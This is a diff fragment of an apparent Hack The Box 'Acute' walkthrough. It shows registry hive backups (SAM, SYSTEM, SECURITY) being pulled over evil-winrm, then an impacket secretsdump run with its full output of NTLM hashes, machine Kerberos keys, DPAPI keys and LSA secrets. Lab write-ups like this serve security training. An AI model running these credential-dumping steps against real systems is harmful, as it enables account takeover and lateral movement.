@@ -553,6 +553,47 @@ Downloading C:\Temp\sam.bak: 64.0kB [00:00, 209MB/s]
 evil-winrm-py PS C:\Temp> download system.bak .
 Downloading C:\Temp\system.bak: 100%|███████████████████████████████████| 11.6M/11.6M [00:05<00:00, 2.42MB/s]
 [+] File downloaded successfully and saved as: /home/kali/htb/acute/system.bak
+evil-winrm-py PS C:\Temp> download security.bak .
+Downloading C:\Temp\security.bak: 64.0kB [00:00, 352MB/s]                                                    
+[+] File downloaded successfully and saved as: /home/kali/htb/acute/security.bak
+```
+
+Then ill download all the files
+
+```python
+❯❯❯ secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ACUTE\ACUTE-PC01$:aes256-cts-hmac-sha1-96:be9a3601da45d14d6e11b5364cdf943c6050b4dc325120c6931d77d55ea77774
+ACUTE\ACUTE-PC01$:aes128-cts-hmac-sha1-96:10b79d6f6567a7a4fe3b15033129a496
+ACUTE\ACUTE-PC01$:des-cbc-md5:15d06815f17054ef
+ACUTE\ACUTE-PC01$:plain_password_hex:385ff9866bd5f5787b3d2407f138ef11820d1878ff3867d3339eb3214622b619fb7beefbe8011f0c60143237c4fc237268dd2a7b28e3865e31a64a0634cbbdcc74d392136c69b47022b6ba57728b2f1eb9c14079a24c483c9357d2ac2c16553a0e473c9f47e24cc11291de8c381e50836a0a09b728bfe62239bee7dd00f1e5445bbd9786a12d846564573955bcb0f69b2f2aed3682b12680fc899c2b34254da22d058b7efbd37c973f6aa55981bb9328527778fdcf502c091ee87886209d17d1ecfd9b482e3cca85b2daa4af2148401ed47968ee78007f6c4511be37579a87326cd501cdc16676b5c21194bd8062db36
+ACUTE\ACUTE-PC01$:aad3b435b51404eeaad3b435b51404ee:d153d12682a0b4f0712c7f2e6e0dade8:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x574d0cc939c9f986cba32d1546a7fa28747425e0
+dpapi_userkey:0x4a77ea6673a027ecd81e4ca010b1d3f70fe1d9cd
+[*] NL$KM 
+ 0000   62 2A 29 8D F9 77 CC DD  EE EB 23 20 B2 E2 AF 59   b*)..w....# ...Y
+ 0010   0B F6 33 E0 95 5D B0 03  B1 01 85 55 9D 16 64 4D   ..3..].....U..dM
+ 0020   53 1F 93 7B FB EF 2B F7  6E 76 B1 02 3D 63 CC DF   S..{..+.nv..=c..
+ 0030   F0 35 6F E3 19 8A 69 C1  2E F6 78 80 45 51 EE 0A   .5o...i...x.EQ..
+NL$KM:622a298df977ccddeeeb2320b2e2af590bf633e0955db003b10185559d16644d531f937bfbef2bf76e76b1023d63ccdff0356fe3198a69c12ef678804551ee0a
+[*] Cleaning up... 
+```
+
+There is no plaintext LSA passwords
+
+```python
 
 ```
 
